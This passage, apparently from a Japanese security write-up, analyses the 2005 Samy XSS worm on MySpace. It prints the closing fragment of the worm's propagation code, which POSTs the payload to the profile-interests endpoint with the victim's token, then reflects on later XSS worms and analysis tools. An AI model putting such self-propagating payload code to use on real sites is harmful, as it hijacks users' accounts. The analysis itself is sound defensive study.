  AS_params[<span class="hljs-string">&apos;interestLabel&apos;</span>] = <span class="hljs-string">&apos;heroes&apos;</span>;
  AS_params[<span class="hljs-string">&apos;submit&apos;</span>] = <span class="hljs-string">&apos;Submit&apos;</span>;
  AS_params[<span class="hljs-string">&apos;interest&apos;</span>] = AG_heroes;
  AS_params[<span class="hljs-string">&apos;hash&apos;</span>] = getHiddenParameter(AU_responseHTML, <span class="hljs-string">&apos;hash&apos;</span>);
  httpSend(<span class="hljs-string">&apos;/index.cfm?fuseaction=profile.processInterests&amp;Mytoken=&apos;</span> + AR_myToken, nothing, <span class="hljs-string">&apos;POST&apos;</span>, paramsToString(AS_params))
}
</code></pre>
<p>&#x3053;&#x308C;&#x306B;&#x3088;&#x308A;&#x88AB;&#x5BB3;&#x8005;&#x306E;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x306B;&#x30DA;&#x30A4;&#x30ED;&#x30FC;&#x30C9;&#x304C;&#x66F8;&#x304D;&#x8FBC;&#x307E;&#x308C;&#x308B;&#x3002;&#x305D;&#x306E;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x3092;&#x95B2;&#x89A7;&#x3057;&#x305F;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x306E;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x4E0A;&#x3067;JavaScript&#x304C;&#x5B9F;&#x884C;&#x3057;&#x3001;&#x305D;&#x306E;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x306E;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x306B;&#x3082;&#x30DA;&#x30A4;&#x30ED;&#x30FC;&#x30C9;&#x304C;&#x66F8;&#x304D;&#x8FBC;&#x307E;&#x308C;&#x308B;&#x3002;&#x4EE5;&#x4E0A;&#x304C;Samy&#x306E;&#x611F;&#x67D3;&#x52D5;&#x4F5C;&#x3067;&#x3042;&#x308B;&#x3002;</p>
<h2 id="&#x6240;&#x611F;">&#x6240;&#x611F;</h2>
<p>Samy&#x306E;&#x7D42;&#x606F;&#x5F8C;&#x3082;<a href="https://www.mcafee.com/japan/security/virT.asp?v=JS/Twettir" target="_blank">Twitter</a>&#x3084;<a href="https://www.symantec.com/connect/blogs/new-xss-facebook-worm-allows-automatic-wall-posts" target="_blank">Facebook</a>&#x306A;&#x3069;&#x3067;XSS&#x30EF;&#x30FC;&#x30E0;&#x306E;&#x88AB;&#x5BB3;&#x304C;&#x767A;&#x751F;&#x3057;&#x3066;&#x3044;&#x308B;&#x3002;&#x4ECA;&#x5F8C;&#x306F;&#x4EEE;&#x60F3;&#x901A;&#x8CA8;&#x306E;&#x30DE;&#x30A4;&#x30CB;&#x30F3;&#x30B0;&#x3092;&#x76EE;&#x7684;&#x3068;&#x3057;&#x305F;XSS&#x30EF;&#x30FC;&#x30E0;&#x304C;&#x30EA;&#x30EA;&#x30FC;&#x30B9;&#x3055;&#x308C;&#x308B;&#x3053;&#x3068;&#x3082;&#x4E88;&#x60F3;&#x3055;&#x308C;&#x308B;&#x3002;&#x5229;&#x7528;&#x8005;&#x306E;&#x591A;&#x3044;SNS&#x3067;XSS&#x30EF;&#x30FC;&#x30E0;&#x304C;&#x30EA;&#x30EA;&#x30FC;&#x30B9;&#x3055;&#x308C;&#x308C;&#x3070;&#x591A;&#x6570;&#x306E;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x306B;&#x611F;&#x67D3;&#x3057;&#x3001;&#x88AB;&#x5BB3;&#x8005;&#x306E;PC&#x30EA;&#x30BD;&#x30FC;&#x30B9;&#x306F;&#x4EEE;&#x60F3;&#x901A;&#x8CA8;&#x306E;&#x30DE;&#x30A4;&#x30CB;&#x30F3;&#x30B0;&#x306B;&#x4F7F;&#x308F;&#x308C;&#x308B;&#x3002;&#x3053;&#x308C;&#x3092;&#x72D9;&#x3046;&#x653B;&#x6483;&#x8005;&#xFF08;&#x500B;&#x4EBA;&#x3001;&#x7D44;&#x7E54;&#x3001;&#x56FD;&#x5BB6;&#xFF09;&#x306F;&#x5C11;&#x306A;&#x304F;&#x306A;&#x3044;&#x3060;&#x308D;&#x3046;&#x3002;&#x65B0;&#x7A2E;&#x306E;XSS&#x30EF;&#x30FC;&#x30E0;&#x306E;&#x30EA;&#x30EA;&#x30FC;&#x30B9;&#x306B;&#x5099;&#x3048;&#x308B;&#x305F;&#x3081;&#x306B;&#x3082;&#x3001;&#x8D77;&#x6E90;&#x3067;&#x3042;&#x308B;Samy&#x3092;&#x89E3;&#x6790;&#x3057;&#x3066;&#x611F;&#x67D3;&#x52D5;&#x4F5C;&#x3092;&#x7406;&#x89E3;&#x3057;&#x305F;&#x3044;&#x3068;&#x8003;&#x3048;&#x305F;&#x3002;</p>
<p>&#x5F53;&#x6642;&#x306E;MySpace&#x306E;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x7DE8;&#x96C6;&#x3084;&#x30D5;&#x30EC;&#x30F3;&#x30C9;&#x7533;&#x8ACB;&#x306F;&#x5358;&#x7D14;&#x306A;&#x51E6;&#x7406;&#x3060;&#x3063;&#x305F;&#x304C;&#x3001;&#x73FE;&#x5728;&#x306E;SNS&#x3067;&#x306F;&#x3053;&#x308C;&#x3088;&#x308A;&#x8907;&#x96D1;&#x306B;&#x306A;&#x3063;&#x3066;&#x3044;&#x308B;&#x3002;&#x307E;&#x305F;CSP&#x306E;&#x5C0E;&#x5165;&#x3084;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x306E;&#x4FDD;&#x8B77;&#x6A5F;&#x80FD;&#x306B;&#x3088;&#x308A;XSS&#x306E;&#x60AA;&#x7528;&#x3082;&#x96E3;&#x3057;&#x304F;&#x306A;&#x3063;&#x3066;&#x3044;&#x308B;&#x3002;&#x3053;&#x308C;&#x3092;&#x6A5F;&#x306B;&#x73FE;&#x5728;&#x306E;SNS&#x3092;&#x6A19;&#x7684;&#x3068;&#x3057;&#x305F;XSS&#x30EF;&#x30FC;&#x30E0;&#x306E;&#x73FE;&#x5B9F;&#x7684;&#x306A;&#x8105;&#x5A01;&#x3092;&#x8003;&#x3048;&#x3066;&#x3044;&#x304D;&#x305F;&#x3044;&#x3002;XSS&#x306E;&#x8106;&#x5F31;&#x6027;&#x304C;&#x3042;&#x3063;&#x305F;&#x3068;&#x4EEE;&#x5B9A;&#x3057;&#x3066;&#x3001;&#x3069;&#x306E;&#x3088;&#x3046;&#x306B;JavaScript&#x3092;&#x5B9F;&#x88C5;&#x3059;&#x308C;&#x3070;&#x611F;&#x67D3;&#x52D5;&#x4F5C;&#x3092;&#x5B9F;&#x73FE;&#x3067;&#x304D;&#x308B;&#x306E;&#x304B;&#x3001;&#x307E;&#x305F;&#x653B;&#x6483;&#x8005;&#x306E;&#x5229;&#x76CA;&#x306B;&#x306A;&#x308B;&#x306E;&#x304B;&#x3092;&#x8003;&#x3048;&#x308B;&#x3053;&#x3068;&#x3082;&#x91CD;&#x8981;&#x3060;&#x3002;</p>
<p>&#x4ECA;&#x56DE;&#x306E;&#x89E3;&#x6790;&#x3067;&#x306F;&#x30B3;&#x30FC;&#x30C9;&#x306E;&#x6574;&#x5F62;&#x3068;&#x53EF;&#x8996;&#x5316;&#x306E;&#x305F;&#x3081;&#x306B;Visual Studio&#x3092;&#x3001;JavaScript&#x306E;&#x30C7;&#x30D0;&#x30C3;&#x30B0;&#x306E;&#x305F;&#x3081;&#x306B;IE6&#x3068;Firefox&#x3092;&#x3001;HTTP&#x901A;&#x4FE1;&#x306E;&#x53D6;&#x5F97;&#x306E;&#x305F;&#x3081;&#x306B;Burp Suite&#x3092;&#x4F7F;&#x7528;&#x3057;&#x305F;&#x3002;Samy&#x306E;&#x30B3;&#x30FC;&#x30C9;&#x306F;&#x5727;&#x7E2E;&#x51E6;&#x7406;&#x3092;&#x9664;&#x3044;&#x3066;&#x96E3;&#x8AAD;&#x5316;&#x306F;&#x65BD;&#x3055;&#x308C;&#x3066;&#x3044;&#x306A;&#x304B;&#x3063;&#x305F;&#x3002;&#x3057;&#x304B;&#x3057;XSS&#x30EF;&#x30FC;&#x30E0;&#x3092;&#x542B;&#x3080;&#x73FE;&#x4EE3;&#x306E;JavaScript&#x30DE;&#x30EB;&#x30A6;&#x30A7;&#x30A2;&#x306F;&#x9AD8;&#x5EA6;&#x306A;&#x96E3;&#x8AAD;&#x5316;&#x304C;&#x65BD;&#x3055;&#x308C;&#x3066;&#x3044;&#x308B;&#x305F;&#x3081;&#x3001;<a href="http://relentless-coding.org/projects/jsdetox/" target="_blank">JSDetox</a>&#x306A;&#x3069;&#x3092;&#x4F7F;&#x7528;&#x3057;&#x305F;JavaScript&#x306E;&#x89E3;&#x6790;&#x6280;&#x8853;&#x304C;&#x6C42;&#x3081;&#x3089;&#x308C;&#x308B;&#x3002;&#x96E3;&#x8AAD;&#x5316;&#x3055;&#x308C;&#x305F;JavaScript&#x30DE;&#x30EB;&#x30A6;&#x30A7;&#x30A2;&#x306E;&#x89E3;&#x6790;&#x65B9;&#x6CD5;&#x3082;&#x6A5F;&#x4F1A;&#x304C;&#x3042;&#x308C;&#x3070;&#x8ABF;&#x67FB;&#x3057;&#x3066;&#x307E;&#x3068;&#x3081;&#x305F;&#x3044;&#x3002;</p>
<hr>
<p><sup id="fn1"><a href="#f1">1</a></sup> &#x5F53;&#x6642;&#x306E;IE&#x3068;Safari&#x306E;&#x307F;&#x3067;&#x89E3;&#x91C8;&#x3055;&#x308C;&#x308B;&#x7279;&#x6B8A;&#x306A;CSS&#x69CB;&#x6587;&#x3092;&#x4F7F;&#x7528;&#x3059;&#x308B;&#x3053;&#x3068;&#x3067;&#x3001;&#x30D5;&#x30A3;&#x30EB;&#x30BF;&#x30FC;&#x51E6;&#x7406;&#x3092;&#x56DE;&#x907F;&#x3057;&#x3066;JavaScript&#x3092;&#x5B9F;&#x884C;&#x3057;&#x305F;&#x3002;&#x3053;&#x306E;&#x8A73;&#x7D30;&#x306F;<a href="https://samy.pl/popular/tech.html" target="_blank">Kamkar&#x6C0F;&#x306E;&#x30B5;&#x30A4;&#x30C8;</a>&#x3084;OWASP &amp; WASC AppSec 2007&#x306E;&#x300C;<a href="https://www.owasp.org/images/7/79/OWASP-WASCAppSec2007SanJose_SamyWorm.ppt" target="_blank">The MySpace Worm</a>&#x300D;&#x3067;&#x89E3;&#x8AAC;&#x3055;&#x308C;&#x3066;&#x3044;&#x308B;&#x3002;<br><sup id="fn2"><a href="#f2">2</a></sup> IE6&#x3067;&#x306F; <code>url()</code> &#x3078;&#x306E;&#x5F15;&#x6570;&#x3092;&#x5F15;&#x7528;&#x7B26;&#x3067;&#x62EC;&#x3089;&#x306A;&#x304F;&#x3066;&#x3082;&#x6B63;&#x5E38;&#x306B;&#x52D5;&#x4F5C;&#x3057;&#x305F;&#x3053;&#x3068;&#x304B;&#x3089;&#x3001;IE5&#x4EE5;&#x524D;&#x3078;&#x306E;&#x5BFE;&#x51E6;&#x3060;&#x3068;&#x8003;&#x3048;&#x308B;&#x3002;<a href="http://blogoscoped.com/archive/2005-10-14-n81.html" target="_blank">Kamkar&#x6C0F;&#x3078;&#x306E;&#x30A4;&#x30F3;&#x30BF;&#x30D3;&#x30E5;&#x30FC;</a>&#x306E;&#x306A;&#x304B;&#x3067;&#x300C;&#x79C1;&#x306E;Safari&#x3067;&#x306F;&#x52D5;&#x304B;&#x306A;&#x304B;&#x3063;&#x305F;&#x304C;&#x3001;&#x9A5A;&#x304F;&#x3053;&#x3068;&#x306B;&#x53E4;&#x3044;&#x30D0;&#x30FC;&#x30B8;&#x30E7;&#x30F3;&#x3092;&#x4F7F;&#x3063;&#x3066;&#x3044;&#x305F;&#x5F7C;&#x5973;&#x306F;&#x611F;&#x67D3;&#x3057;&#x305F;&#x300D;&#x3068;&#x8A9E;&#x3063;&#x3066;&#x3044;&#x308B;&#x3088;&#x3046;&#x306B;&#x3001;Kamkar&#x6C0F;&#x306F;Safari&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x3092;&#x6A19;&#x7684;&#x3068;&#x3057;&#x3066;&#x8003;&#x3048;&#x3066;&#x3044;&#x306A;&#x304B;&#x3063;&#x305F;&#x3002;  </p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="impact_of_cookie_bomb.html" class="navigation navigation-prev " aria-label="Previous page: CRLFインジェクションによるCookie Bombの脅威">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="crlfi_via_path_of_request-uri.html" class="navigation navigation-next " aria-label="Next page: Request-URIのパスからのCRLFインジェクション">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"XSSワーム「Samy」の動作を解析する","level":"3.2","depth":1,"next":{"title":"Request-URIのパスからのCRLFインジェクション","level":"3.3","depth":1,"path":"2018/crlfi_via_path_of_request-uri.md","ref":"2018/crlfi_via_path_of_request-uri.md","articles":[]},"previous":{"title":"CRLFインジェクションによるCookie Bombの脅威","level":"3.1","depth":1,"path":"2018/impact_of_cookie_bomb.md","ref":"2018/impact_of_cookie_bomb.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-sharing"],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"book.css"}},"file":{"path":"2018/analyzing_samy_xss_worm.md","mtime":"2019-03-21T11:29:46.789Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-21T22:46:01.183Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

